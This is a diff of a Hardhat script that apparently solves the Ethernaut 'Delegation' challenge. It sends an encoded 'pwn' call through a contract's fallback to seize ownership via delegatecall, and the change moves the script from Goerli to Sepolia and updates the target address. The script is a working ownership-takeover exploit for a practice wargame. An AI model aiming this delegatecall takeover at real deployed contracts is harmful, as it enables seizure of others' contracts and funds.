@@ -2,10 +2,7 @@ import { ethers } from "hardhat";
 
 require("dotenv").config();
 
-const { GOERLI_URL, PRIVATE_KEY, CONTRACT_VICTIM } = process.env;
-const tx = {
-    
-  };
+const { SEPOLIA_URL, PRIVATE_KEY, CONTRACT_VICTIM } = process.env;
 
 async function main() {
   const [signer] = await ethers.getSigners();
@@ -13,7 +10,7 @@ async function main() {
   console.log("Attackers account:", signer.address);
     
   const Delegation = await ethers.getContractFactory("Delegation");
-  const delegation = await Delegation.attach("0xAf7639B78337d4c9270199b8C985a95f2CaC6568");
+  const delegation = await Delegation.attach("0xc0A24934FE0E6F5B94c0b81c84505570C2c23Dac");
   
   let owner = await delegation.owner();
   console.log("Victim's Owner", owner);
@@ -23,7 +20,7 @@ async function main() {
   const data = iface.encodeFunctionData(`pwn`, [])
 
   const tx = await signer.sendTransaction({
-    to: '0xAf7639B78337d4c9270199b8C985a95f2CaC6568',
+    to: '0xc0A24934FE0E6F5B94c0b81c84505570C2c23Dac',
     data,
     gasLimit: ethers.BigNumber.from(`100000`),
   });
@@ -31,7 +28,7 @@ async function main() {
   await tx.wait(1);
   
   owner = await delegation.owner();
-  console.log("Victim's Owner", owner);
+  console.log("New victim's owner", owner);
 
 }
 
